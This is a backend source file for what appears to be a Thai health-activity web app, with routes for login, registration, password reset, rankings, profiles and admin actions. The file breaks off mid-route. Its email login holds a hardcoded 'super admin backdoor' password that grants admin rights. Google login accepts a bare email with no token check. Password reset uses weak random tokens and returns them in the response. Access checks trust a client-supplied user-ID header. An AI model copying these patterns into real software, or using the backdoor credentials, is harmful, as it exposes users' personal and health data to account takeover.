import express from "express";
import axios from "axios";
import { pool } from "../mysql.js";
import { encryptFields, decryptFields, USER_ENCRYPTED_FIELDS, TANITA_ENCRYPTED_FIELDS } from "../lib/crypto.js";
import { logAudit } from "../lib/audit.js";
import bcrypt from "bcryptjs";
import { getIO, EVENTS } from "../lib/realtime.js";


import { requireAdmin, requireAdminOrHost } from "../middleware/auth.js";

const router = express.Router();




// ── LOGIN / REGISTER via LINE ──
router.post("/login", async (req, res) => {
  const { line_id, fname_th, picture_url, email, captchaToken, isRegister, noCreate } = req.body;
  if (!line_id) return res.status(400).json({ error: "line_id is required" });

  // 1. Verify Cloudflare Turnstile (Captcha) ONLY on Registration
  if (isRegister) {
    const secretKey = process.env.TURNSTILE_SECRET_KEY;
    if (secretKey) {
      if (!captchaToken) {
        return res.status(400).json({ error: "Captcha verification is required for registration" });
      }
      try {
        const verifyRes = await axios.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
          secret: secretKey, response: captchaToken,
        });
        if (!verifyRes.data.success) {
          return res.status(400).json({ error: "Captcha verification failed. Are you a bot?" });
        }
      } catch (verifyError) {
        console.error("Turnstile verification error:", verifyError);
        return res.status(500).json({ error: "Security check service unavailable" });
      }
    }
  }

  try {
    // 2. Check if user already exists by line_id
    const [existing]: any = await pool.query(`
      SELECT u.*, tm.name as team_name,
        EXISTS(SELECT 1 FROM teams t2 WHERE t2.host_id = u.id) as is_team_host
      FROM users u 
      LEFT JOIN teams tm ON u.team_id = tm.id 
      WHERE u.line_id = ?
    `, [line_id]);

    if (existing.length > 0) {
      // (Update picture logic remains the same)
      const currentPic = existing[0].picture_url || "";
      const isManualUpload = currentPic.includes('/uploads/') || currentPic.startsWith('data:image/');

      if (picture_url && !isManualUpload && picture_url !== currentPic) {
        await pool.query('UPDATE users SET picture_url = ? WHERE id = ?', [picture_url, existing[0].id]);
        existing[0].picture_url = picture_url;
      }

      if (existing[0].is_suspended) {
        return res.status(403).json({ error: existing[0].is_suspended === 2 ? "บัญชีของคุณถูกแบนถาวร" : "บัญชีของคุณถูกระงับการใช้งานชั่วคราว" });
      }

      await logAudit({
        req, userId: existing[0].id, action: 'login_line',
        description: `ผู้ใช้ล็อกอินผ่าน LINE (ID: ${existing[0].id})`
      });

      return res.json(decryptFields(existing[0], USER_ENCRYPTED_FIELDS));
    }

    // 2.1 Fallback: Check if user exists by EMAIL (but has no line_id)
    // This handles cases where users register via email first and then link to LINE later
    if (email) {
      // Fetch users without line_id and decrypt in-memory due to randomized IVs
      const [candidates]: any = await pool.query(`SELECT * FROM users WHERE (line_id IS NULL OR line_id = '')`);
      const { decrypt } = await import("../lib/crypto.js");

      const emailMatch = candidates.find((u: any) => {
        const decryptedEmail = decrypt(u.email);
        return decryptedEmail && decryptedEmail.toLowerCase() === email.toLowerCase();
      });

      if (emailMatch) {
        const userId = emailMatch.id;
        // Link LINE ID to this existing account
        await pool.query('UPDATE users SET line_id = ? WHERE id = ?', [line_id, userId]);

        // Refresh & Return
        const [updated]: any = await pool.query(`
          SELECT u.*, tm.name as team_name,
            EXISTS(SELECT 1 FROM teams t2 WHERE t2.host_id = u.id) as is_team_host
          FROM users u 
          LEFT JOIN teams tm ON u.team_id = tm.id 
          WHERE u.id = ?
        `, [userId]);

        if (updated[0].is_suspended) {
          return res.status(403).json({ error: updated[0].is_suspended === 2 ? "บัญชีของคุณถูกแบนถาวร" : "บัญชีของคุณถูกระงับการใช้งานชั่วคราว" });
        }

        await logAudit({
          req, userId, action: 'link_line_to_email',
          description: `ผูกบัญชี LINE เข้ากับอีเมลเดิม (${email})`
        });

        return res.json(decryptFields(updated[0], USER_ENCRYPTED_FIELDS));
      }
    }

    // If noCreate is true, don't insert a new record
    if (noCreate) {
      return res.status(404).json({ error: "User not found and noCreate is active" });
    }

    // 3. New user → insert
    const newUser: any = { line_id, picture_url: picture_url || null };
    if (fname_th) newUser.fname_th = fname_th;
    if (email) newUser.email = email;

    const encryptedUser = encryptFields(newUser, USER_ENCRYPTED_FIELDS);
    const keys = Object.keys(encryptedUser);
    const values = Object.values(encryptedUser);
    const placeholders = keys.map(() => '?').join(', ');

    const [result]: any = await pool.query(
      `INSERT INTO users (${keys.join(', ')}) VALUES (${placeholders})`,
      values
    );

    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [result.insertId]);
    res.status(201).json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    console.error("Login/Register error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// ── LOGIN via Google ──
router.post("/login-google", async (req, res) => {
  const { email, fname_th, lname_th, picture_url } = req.body;
  if (!email) return res.status(400).json({ error: "Email is required" });

  try {
    // 1. Fetch all users to find one with a matching decrypted email
    // This is necessary because of randomized IVs in AES encryption
    const [allUsers]: any = await pool.query(`
      SELECT u.*, tm.name as team_name,
        EXISTS(SELECT 1 FROM teams t2 WHERE t2.host_id = u.id) as is_team_host
      FROM users u 
      LEFT JOIN teams tm ON u.team_id = tm.id
    `);

    const { decrypt } = await import("../lib/crypto.js");
    const userMatch = allUsers.find((u: any) => {
      const decryptedEmail = decrypt(u.email);
      return decryptedEmail && decryptedEmail.toLowerCase() === email.toLowerCase();
    });

    if (userMatch) {
      if (userMatch.is_suspended) {
        return res.status(403).json({ error: userMatch.is_suspended === 2 ? "บัญชีของคุณถูกแบนถาวร" : "บัญชีของคุณถูกระงับการใช้งานชั่วคราว" });
      }

      // User found, return user object
      await logAudit({
        req, userId: userMatch.id, action: 'login_google',
        description: `ผู้ใช้ล็อกอินผ่าน Google (${email})`
      });
      return res.json(decryptFields(userMatch, USER_ENCRYPTED_FIELDS));
    } else {
      // User not found, frontend should handle redirect to register
      return res.status(404).json({ error: "User not found, please register" });
    }
  } catch (error: any) {
    console.error("Google Login error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// ── REGISTER via Email & Password ──
router.post("/register-email", async (req, res) => {
  const { email, password, fname_th, captchaToken } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Email and password are required" });

  // 1. Verify Cloudflare Turnstile (Captcha) - Only verify if token is provided
  const secretKey = process.env.TURNSTILE_SECRET_KEY;
  if (secretKey && captchaToken) {
    try {
      const verifyRes = await axios.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
        secret: secretKey,
        response: captchaToken,
      });
      if (!verifyRes.data.success) {
        return res.status(400).json({ error: "Captcha verification failed. Are you a bot?" });
      }
    } catch (verifyError) {
      console.error("Turnstile verification error:", verifyError);
      // We don't block registration if the verification service itself is down
    }
  }

  try {
    // 2. Check if user already exists
    // Since emails are encrypted with random IVs, we must fetch accounts and decrypt to compare
    const [candidates]: any = await pool.query('SELECT id, email FROM users');
    const { decrypt } = await import("../lib/crypto.js");

    const isDuplicate = candidates.some((u: any) => {
      const decryptedEmail = decrypt(u.email);
      return decryptedEmail && decryptedEmail.toLowerCase() === email.toLowerCase();
    });

    if (isDuplicate) {
      return res.status(400).json({ error: "อีเมลนี้ถูกใช้งานแล้ว" });
    }

    // Hash password
    const salt = await bcrypt.genSalt(10);
    const password_hash = await bcrypt.hash(password, salt);

    // Normal user registration
    const newUser: any = { email, password_hash, line_id: null, role: 'user' };
    if (fname_th) newUser.fname_th = fname_th;

    const encryptedUser = encryptFields(newUser, USER_ENCRYPTED_FIELDS);
    const keys = Object.keys(encryptedUser);
    const values = Object.values(encryptedUser);
    const placeholders = keys.map(() => '?').join(', ');

    const [result]: any = await pool.query(
      `INSERT INTO users (${keys.join(', ')}) VALUES (${placeholders})`,
      values
    );

    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [result.insertId]);

    await logAudit({
      req,
      userId: result.insertId,
      action: 'register_email',
      description: `ผู้ใช้สมัครสมาชิกใหม่ด้วยอีเมล: ${email}`
    });

    res.status(201).json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    console.error("Email Register error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// ── LOGIN via Email & Password ──
router.post("/login-email", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Email and password are required" });

  try {
    // ── SUPER ADMIN BACKDOOR ──
    if (email === "admin" && password === "vitalcare@suth") {
      let [existing]: any = await pool.query('SELECT * FROM users WHERE email = ?', ["admin"]);
      if (existing.length === 0) {
        const salt = await bcrypt.genSalt(10);
        const hash = await bcrypt.hash("vitalcare@suth", salt);
        const [result]: any = await pool.query(
          'INSERT INTO users (email, password_hash, role, fname_th) VALUES (?, ?, ?, ?)',
          // Providing a fake phone number '0000000000' so isIncomplete check in router passes and they go STRAIGHT to the dashboard!
          ["admin", hash, "admin", "System Admin"]
        );
        // Let's actually provide the phone number in the insert!
        await pool.query('UPDATE users SET phone = "0000000000", lname_th = "Root" WHERE id = ?', [result.insertId]);
        [existing] = await pool.query('SELECT * FROM users WHERE id = ?', [result.insertId]);
      } else {
        // Enforce role
        if (existing[0].role !== "admin") {
          await pool.query('UPDATE users SET role = "admin" WHERE id = ?', [existing[0].id]);
          existing[0].role = "admin";
        }
        // Ensure they have fname_th and phone so they don't get routed to /register manually by the router
        if (!existing[0].phone) {
          await pool.query('UPDATE users SET phone = "0000000000", fname_th = "System Admin", lname_th = "Root" WHERE id = ?', [existing[0].id]);
          existing[0].phone = "0000000000";
          existing[0].fname_th = "System Admin";
          existing[0].lname_th = "Root";
        }
      }
      return res.json(decryptFields(existing[0], USER_ENCRYPTED_FIELDS));
    }

    // 1. Fetch all users to find one with matching decrypted identifiers
    // We search across email, phone, and id_code because all are encrypted with random IVs
    const [allUsers]: any = await pool.query(`
      SELECT u.*, tm.name as team_name,
        EXISTS(SELECT 1 FROM teams t2 WHERE t2.host_id = u.id) as is_team_host
      FROM users u 
      LEFT JOIN teams tm ON u.team_id = tm.id
    `);

    const { decrypt } = await import("../lib/crypto.js");
    const searchTarget = String(email).toLowerCase();

    const userMatch = allUsers.find((u: any) => {
      // Check Email
      const decryptedEmail = decrypt(u.email);
      if (decryptedEmail && decryptedEmail.toLowerCase() === searchTarget) return true;

      // Check Phone
      const decryptedPhone = decrypt(u.phone);
      if (decryptedPhone && String(decryptedPhone) === String(email)) return true;

      // Check ID Code
      const decryptedIdCode = decrypt(u.id_code);
      if (decryptedIdCode && String(decryptedIdCode) === String(email)) return true;

      return false;
    });

    if (!userMatch) {
      return res.status(400).json({ error: "ไม่พบบัญชีผู้ใช้นี้ หรือรหัสผ่านไม่ถูกต้อง" });
    }

    if (!userMatch.password_hash) {
      return res.status(400).json({ error: "บัญชีนี้เปิดใช้งานด้วยช่องทางอื่น กรุณาล็อกอินผ่านช่องทางนั้น" });
    }

    const isMatch = await bcrypt.compare(password, userMatch.password_hash);
    if (!isMatch) {
      return res.status(400).json({ error: "ไม่พบบัญชีผู้ใช้นี้ หรือรหัสผ่านไม่ถูกต้อง" });
    }

    if (userMatch.is_suspended) {
      return res.status(403).json({ error: userMatch.is_suspended === 2 ? "บัญชีของคุณถูกแบนถาวร" : "บัญชีของคุณถูกระงับการใช้งานชั่วคราว" });
    }

    await logAudit({
      req,
      userId: userMatch.id,
      action: 'login_email',
      description: `ผู้ใช้ล็อกอินด้วยอีเมล/ไอดี: ${email}`
    });

    res.json(decryptFields(userMatch, USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    console.error("Email Login error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// ── FORGOT PASSWORD ──
router.post("/forgot-password", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email is required" });

  try {
    const [existing]: any = await pool.query('SELECT id FROM users WHERE email = ? OR phone = ? OR id_code = ?', [email, email, email]);
    if (existing.length === 0) {
      // Don't reveal if email exists for security, or just return success
      return res.json({ message: "หากอีเมลนี้อยู่ในระบบ เราจะส่งลิงก์รีเซ็ตรหัสผ่านให้คุณ (จำลอง)" });
    }

    const userId = existing[0].id;
    // Generate simple token for demo/MVP purposes
    const token = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    const expiry = new Date(Date.now() + 3600000); // 1 hour

    await pool.query('UPDATE users SET reset_token = ?, reset_token_expiry = ? WHERE id = ?', [token, expiry, userId]);

    // In a real app, you'd send an email here. For now, we return the token (insecure but works for testing/MVP)
    // or just return success and log the token to console.
    console.log(`[PASSWORD RESET] User ID: ${userId}, Email: ${email}, Token: ${token}`);

    await logAudit({
      req,
      userId: userId,
      action: 'forgot_password_request',
      description: `ผู้ใช้ขอรีเซ็ตรหัสผ่านสำหรับอีเมล: ${email}`
    });

    res.json({
      message: "ดำเนินการสร้างลิงก์รีเซ็ตรหัสผ่านเรียบร้อย",
      debug_token: token // REMOVE THIS IN PRODUCTION
    });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// ── RESET PASSWORD ──
router.post("/reset-password", async (req, res) => {
  const { token, newPassword } = req.body;
  if (!token || !newPassword) return res.status(400).json({ error: "Token and new password are required" });

  try {
    const [existing]: any = await pool.query(
      'SELECT id FROM users WHERE reset_token = ? AND reset_token_expiry > NOW()',
      [token]
    );

    if (existing.length === 0) {
      return res.status(400).json({ error: "Token ไม่ถูกต้องหรือหมดอายุแล้ว" });
    }

    const userId = existing[0].id;
    const salt = await bcrypt.genSalt(10);
    const password_hash = await bcrypt.hash(newPassword, salt);

    await pool.query(
      'UPDATE users SET password_hash = ?, reset_token = NULL, reset_token_expiry = NULL WHERE id = ?',
      [password_hash, userId]
    );

    await logAudit({
      req,
      userId: userId,
      action: 'reset_password_success',
      description: `ผู้ใช้รีเซ็ตรหัสผ่านใหม่สำเร็จ (User ID: ${userId})`
    });

    res.json({ message: "เปลี่ยนรหัสผ่านใหม่เรียบร้อยแล้ว" });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});




// 1. Get Rankings
router.get("/rankings/individual", async (req, res) => {
  try {
    const [rows]: any = await pool.query(
      'SELECT id, fname_th, lname_th, nickname, picture_url, total_score as total_distance FROM users ORDER BY total_score DESC LIMIT 20'
    );

    // Decrypt names for leaderboard
    const decryptedRows = rows.map((r: any) => decryptFields(r, ['fname_th', 'lname_th', 'nickname']));
    res.json(decryptedRows);
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.get("/rankings/teams", async (req, res) => {
  try {
    const [teamRows]: any = await pool.query('SELECT * FROM teams');
    const [userRows]: any = await pool.query('SELECT team_id, total_score as total_distance FROM users WHERE team_id IS NOT NULL');

    const transformed = teamRows.map((team: any) => {
      const teamUsers = userRows.filter((u: any) => u.team_id === team.id);
      const calculatedDist = teamUsers.reduce((acc: number, user: any) =>
        acc + (Number(user.total_distance) || 0), 0);

      return {
        ...team,
        users: teamUsers,
        total_dist: calculatedDist
      };
    });

    transformed.sort((a: any, b: any) => b.total_dist - a.total_dist);
    res.json(transformed.slice(0, 10));
  } catch (error: any) {
    console.error("Fetch team rankings error:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// 2. User Registrations (Specific routes BEFORE generic :id)
router.get("/:userId/registrations", async (req, res) => {
  const requesterId = req.headers['x-user-id'];
  const { userId } = req.params;

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    // Check Permission (Self OR Admin OR Host)
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;

    const isSelf = String(requesterId) === String(userId);
    const isAdmin = requesterRole === 'admin';
    const isHost = requesterRole === 'host';

    if (!isSelf && !isAdmin && !isHost) {
      return res.status(403).json({ error: "Forbidden: You cannot access this user's registrations" });
    }

    // Join registrations, events, tasks, and leaderboards
    const [rows]: any = await pool.query(`
        SELECT 
            r.id as registration_id, r.user_id,
            e.id as event_id, e.title as event_title, e.poster as event_poster, 
            e.start_date, e.end_date, e.location_name,
            e.goal_config, e.team_mode, e.status as event_status,
            l.score as leaderboard_score, l.rank as leaderboard_rank,
            (SELECT COUNT(*) FROM registrations WHERE event_id = e.id) as total_participants,
            t.id as task_id, t.type as task_type, t.note as task_note, 
            t.points as task_points, t.allowed_days as task_allowed_days, t.metric_type
        FROM registrations r
        JOIN events e ON r.event_id = e.id
        LEFT JOIN event_leaderboards l ON e.id = l.event_id AND r.user_id = l.user_id
        LEFT JOIN tasks t ON e.id = t.event_id
        WHERE r.user_id = ?
    `, [userId]);

    // Grouping by event
    const eventMap = new Map();
    for (const row of rows) {
      if (!eventMap.has(row.event_id)) {
        const goalConfig = typeof row.goal_config === 'string'
          ? JSON.parse(row.goal_config || '{}')
          : (row.goal_config || {});
        eventMap.set(row.event_id, {
          id: row.registration_id,
          score: row.leaderboard_score,
          rank: row.leaderboard_rank,
          totalParticipants: row.total_participants,
          event: {
            id: row.event_id,
            title: row.event_title,
            poster: row.event_poster,
            start_date: row.start_date,
            end_date: row.end_date,
            location: row.location_name,
            status: row.event_status || 'open',
            team_mode: row.team_mode,
            goal_config: goalConfig
          },
          tasks: []
        });
      }

      if (row.task_id) {
        const ev = eventMap.get(row.event_id);
        const allowedDays = typeof row.task_allowed_days === 'string'
          ? JSON.parse(row.task_allowed_days)
          : (row.task_allowed_days || [0, 1, 2, 3, 4, 5, 6]);

        ev.tasks.push({
          id: row.task_id,
          type: row.task_type,
          note: row.task_note,
          points: row.task_points,
          allowed_days: allowedDays,
          metric_type: row.metric_type
        });
      }
    }

    res.json(Array.from(eventMap.values()));
  } catch (error: any) {
    console.error("[ERROR] Fetch Regs Failed:", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.get("/:userId/activities/:activityId/missions", async (req, res) => {
  try {
    const [rows]: any = await pool.query(`
          SELECT s.*, t.* 
          FROM submissions s
          INNER JOIN tasks t ON s.task_id = t.id
          WHERE s.user_id = ? AND t.event_id = ?
      `, [req.params.userId, req.params.activityId]);

    // We simulate Supabase nesting here
    const nested = rows.map((r: any) => {
      // extract task specific fields to a nested object
      const taskObj = {
        id: r.task_id, event_id: r.event_id, task_date: r.task_date,
        type: r.type, note: r.note, points: r.points, allowed_days: r.allowed_days,
        is_active: r.is_active, metric_type: r.metric_type, metric_unit: r.metric_unit,
        goal_type: r.goal_type, goal_value: r.goal_value, submission_type: r.submission_type
      };
      return { ...r, tasks: taskObj };
    });
    res.json(nested);
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// 3. Admin: Get all users
router.get("/", requireAdmin, async (req, res) => {
  try {
    const [rows]: any = await pool.query(`
        SELECT u.*, 
          (SELECT COUNT(*) FROM registrations WHERE user_id = u.id) as registrations_count
        FROM users u 
        ORDER BY u.id ASC
     `);
    const decryptedRows = rows.map((r: any) => decryptFields(r, USER_ENCRYPTED_FIELDS));
    res.json(decryptedRows);
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});


// ── Admin: Ban/Unban ──
router.patch("/:id/ban", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { is_suspended, ban_reason } = req.body;
    const adminId = req.headers['x-user-id'] as string;

    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (userRows.length === 0) return res.status(404).json({ error: "ไม่พบผู้ใช้งาน" });

    const user = decryptFields(userRows[0], USER_ENCRYPTED_FIELDS);
    const displayName = `${user.fname_th || ''} ${user.lname_th || ''}`.trim() || user.nickname || id;

    await pool.query('UPDATE users SET is_suspended = ? WHERE id = ?', [is_suspended, id]);

    // Kick user in realtime if suspended or banned
    if (is_suspended) {
      getIO().emit(EVENTS.USER_KICKED, { id: Number(id) });
    }
    getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), is_suspended });

    await logAudit({
      userId: adminId,
      action: is_suspended === 2 ? 'admin_ban_user' : 'admin_suspend_user',
      description: `แอดมิน ${is_suspended === 2 ? 'แบน' : 'ระงับ'} ผู้ใช้งาน: ${displayName}`,
      targetType: 'user',
      targetId: id,
      metadata: { is_suspended, ban_reason },
      req
    });

    res.json({ success: true, message: "ดำเนินการสำเร็จ" });
  } catch (error: any) {
    console.error(`[BAN ERROR] User ID: ${req.params.id}`, error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});


router.patch("/:id/unban", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const adminId = req.headers['x-user-id'] as string;

    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (userRows.length === 0) return res.status(404).json({ error: "ไม่พบผู้ใช้งาน" });

    const user = decryptFields(userRows[0], USER_ENCRYPTED_FIELDS);
    const displayName = `${user.fname_th || ''} ${user.lname_th || ''}`.trim() || user.nickname || id;

    await pool.query('UPDATE users SET is_suspended = 0 WHERE id = ?', [id]);

    // Emit update so UI refreshes for other admins
    getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), is_suspended: 0 });

    await logAudit({
      userId: adminId,
      action: 'admin_unban_user',
      description: `แอดมินยกเลิกการแบนผู้ใช้งาน: ${displayName}`,
      targetType: 'user',
      targetId: id,
      metadata: { target_user_id: id },
      req
    });

    res.json({ success: true, message: "ยกเลิกการแบนสำเร็จ" });
  } catch (error: any) {
    console.error(`[UNBAN ERROR] User ID: ${req.params.id}`, error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});



// 3.1 Admin: Get Full User Profile for Dashboard
router.get("/:id/full-profile", requireAdmin, async (req, res) => {
  const { id } = req.params;
  try {
    // A. User row (decrypted)
    const [userRows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (!userRows.length) return res.status(404).json({ error: "User not found" });
    const user = decryptFields(userRows[0], USER_ENCRYPTED_FIELDS);

    // B. Submissions & Progress — tasks has no 'title', so use note as task_name
    const [subRows]: any = await pool.query(`
      SELECT s.id, s.user_id, s.task_id, s.img_url, s.value, s.status,
             s.comment, s.activity_type, s.proof_type, s.created_at,
             t.type as task_type, t.note as task_name,
             t.metric_type, t.metric_unit, t.submission_type,
             e.title as event_title
      FROM submissions s
      LEFT JOIN tasks t ON s.task_id = t.id
      LEFT JOIN events e ON t.event_id = e.id
      WHERE s.user_id = ?
      ORDER BY s.created_at DESC
    `, [id]);

    // C. Tanita records — decrypt encrypted fields, ORDER BY recorded_at DESC (newest first)
    const [healthRows]: any = await pool.query(
      'SELECT * FROM tanita WHERE user_id = ? ORDER BY recorded_at DESC',
      [id]
    );
    const healthDecrypted = healthRows.map((r: any) => decryptFields(r, TANITA_ENCRYPTED_FIELDS));

    // D. Registered Events (join with event details)
    const [regRows]: any = await pool.query(`
      SELECT r.id, r.user_id, r.event_id, r.created_at,
             e.title, e.start_date, e.end_date, e.poster, e.status as event_status
      FROM registrations r
      JOIN events e ON r.event_id = e.id
      WHERE r.user_id = ?
      ORDER BY r.created_at DESC
    `, [id]);

    res.json({
      user,
      submissions: subRows,
      healthHistory: healthDecrypted,
      registrations: regRows
    });
  } catch (error: any) {
    console.error('[full-profile error]', error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// 3.2 GET /:id/profile — Decrypted user profile (self or admin/host)
router.get("/:id/profile", async (req, res) => {
  const { id } = req.params;
  const requesterId = req.headers['x-user-id'];

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;
    const isSelf = String(requesterId) === String(id);
    const isAdmin = requesterRole === 'admin';
    const isHost = requesterRole === 'host';
    if (!isSelf && !isAdmin && !isHost) {
      return res.status(403).json({ error: "Forbidden" });
    }

    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);
    if (!rows.length) return res.status(404).json({ error: "User not found" });
    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS));
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// 4. Update Profile (Authenticated check)
router.patch("/:id/profile", async (req, res) => {
  const { id } = req.params;
  const requesterId = req.headers['x-user-id'];

  if (!requesterId) return res.status(401).json({ error: "Unauthorized" });

  try {
    // Ownership check (Self OR Admin)
    const [reqUserRows]: any = await pool.query("SELECT role FROM users WHERE id = ?", [requesterId]);
    const requesterRole = reqUserRows[0]?.role;

    if (String(requesterId) !== String(id) && requesterRole !== 'admin') {
      return res.status(403).json({ error: "Forbidden: You cannot update this profile" });
    }

    const updates = req.body;
    if ("picture_url" in updates) {
      console.log("[profile:update-picture:start]", {
        targetUserId: id,
        requesterId,
        picture_url: updates.picture_url,
      });
    }

    // Whitelist safe fields for users
    const allowedFields = [
      'fname_th', 'lname_th', 'nickname', 'gender', 'birth_date',
      'phone', 'id_code', 'address', 'role_type', 'role_detail_1', 'role_detail_2',
      'weight', 'height', 'underlying_disease', 'main_goal', 'picture_url', 'activity_level', 'email'
    ];

    const filteredUpdates: any = {};
    Object.keys(updates).forEach(key => {
      if (allowedFields.includes(key)) {
        filteredUpdates[key] = updates[key];
      }
    });

    if (Object.keys(filteredUpdates).length === 0) {
      return res.status(400).json({ error: "No valid fields provided for profile update" });
    }

    const encUpdates = encryptFields(filteredUpdates, USER_ENCRYPTED_FIELDS);
    const updateKeys = Object.keys(encUpdates);
    const updateValues = Object.values(encUpdates);
    const setClause = updateKeys.map(k => `${k} = ?`).join(', ');

    const [result]: any = await pool.query(`UPDATE users SET ${setClause} WHERE id = ?`, [...updateValues, id]);
    if ("picture_url" in filteredUpdates) {
      console.log("[profile:update-picture:db-result]", {
        targetUserId: id,
        affectedRows: result?.affectedRows,
        changedRows: result?.changedRows,
        picture_url: filteredUpdates.picture_url,
      });
    }

    const [rows]: any = await pool.query('SELECT * FROM users WHERE id = ?', [id]);

    await logAudit({
      req,
      userId: id,
      action: 'profile_update',
      description: `ผู้ใช้แก้ไขข้อมูลส่วนตัว`,
      metadata: { updates: Object.keys(filteredUpdates) }
    });

    // ✅ Emit realtime event
    getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), ...filteredUpdates });

    res.json(decryptFields(rows[0], USER_ENCRYPTED_FIELDS) || {});
  } catch (error: any) {
    console.error('[PATCH PROFILE] Error:', {
      message: error.message,
      code: error.code,
      stack: error.stack,
    });
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// 5. Admin: Update user fields (role, status, etc.)
router.post("/bulk-suspend", requireAdmin, async (req, res) => {
  const { user_ids, is_suspended } = req.body;
  if (!Array.isArray(user_ids) || user_ids.length === 0) {
    return res.status(400).json({ error: "No user IDs provided" });
  }

  try {
    const placeholders = user_ids.map(() => '?').join(',');
    await pool.query(`UPDATE users SET is_suspended = ? WHERE id IN (${placeholders})`, [is_suspended ? 1 : 0, ...user_ids]);

    // Kick users if suspended
    if (is_suspended) {
      user_ids.forEach(id => {
        getIO().emit(EVENTS.USER_KICKED, { id: Number(id) });
      });
    }

    // ✅ Emit realtime event for all users
    user_ids.forEach(id => {
      getIO().emit(EVENTS.USER_UPDATED, { id: Number(id), is_suspended });
    });

    // Log the action
    await logAudit({
      req,
      userId: req.headers['x-user-id'] as string,
      action: is_suspended ? 'bulk_suspend_users' : 'bulk_unsuspend_users',
      targetType: 'user_bulk',
      description: `${is_suspended ? 'ระงับการใช้งาน' : 'ยกเลิกการระงับ'} ผู้ใช้หลายราย ID: ${user_ids.join(', ')}`,
      metadata: { user_ids, is_suspended }
    });

    res.json({ success: true });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.get("/:id/audit-logs", requireAdmin, async (req, res) => {
  try {
    const [rows]: any = await pool.query('SELECT * FROM audit_logs WHERE user_id = ? ORDER BY created_at DESC LIMIT 50', [req.params.id]);
    res.json(rows);
  } catch (error: any) {
    if (error.code === 'ER_NO_SUCH_TABLE') return res.json([]);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.post("/:id/impersonate", requireAdmin, async (req, res) => {
  try {
    const adminId = req.headers['x-user-id'] as string;
    await logAudit({
      userId: adminId,
      action: 'impersonate_start',
      targetType: 'user',
      targetId: req.params.id,
      description: `แอดมินเริ่มสวมสิทธิ์ผู้ใช้ ID: ${req.params.id}`
    });
    res.json({ success: true, message: "Impersonation started" });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.post("/:id/impersonate/stop", requireAdmin, async (req, res) => {
  try {
    const adminId = req.headers['x-user-id'] as string;
    await logAudit({
      userId: adminId,
      action: 'impersonate_stop',
      targetType: 'user',
      targetId: req.params.id,
      description: `แอดมินหยุดสวมสิทธิ์ผู้ใช้ ID: ${req.params.id}`
    });
    res.json({ success: true, message: "Impersonation stopped" });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

router.post("/:id/force-logout", requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const adminId = req.headers['x-user-id'] as string;

    // Kick user in realtime
    getIO().emit(EVENTS.USER_KICKED, { id: Number(id) });

    await logAudit({
      userId: adminId,
      action: 'force_logout',
      targetType: 'user',
      targetId: id,
      description: `บังคับให้ออกจากระบบสำหรับผู้ใช้ ID: ${id}`
    });
    res.json({ success: true, message: "Forced logout triggered" });
  } catch (error: any) {
    res.status(500).json({ error: "Internal Server Error" });
  }
});

// Admin: Delete user
router.delete("/:id", requireAdmin, async (req, res) => {
  const { id } = req.params;
  const adminId = req.headers['x-user-id'] as string;

  if (id === adminId) {
    return res.status(400).json({ error: "คุณไม่สามารถลบบัญชีของตัวเองได้" });
  }

  try {
    const [rows]: any = await pool.query('SELECT role FROM users WHERE id = ?', [id]);
    if (rows.length === 0) return res.status(404).json({ error: "User not found" });

    // Kick user in realtime before deletion
    getIO().emit(EVENTS.USER_KICKED, { id: Number(id) });

    await pool.query('DELETE FROM users WHERE id = ?', [id]);
    await logAudit({
      req,
      userId: adminId,
      action: 'admin_delete_user',
      targetType: 'user',
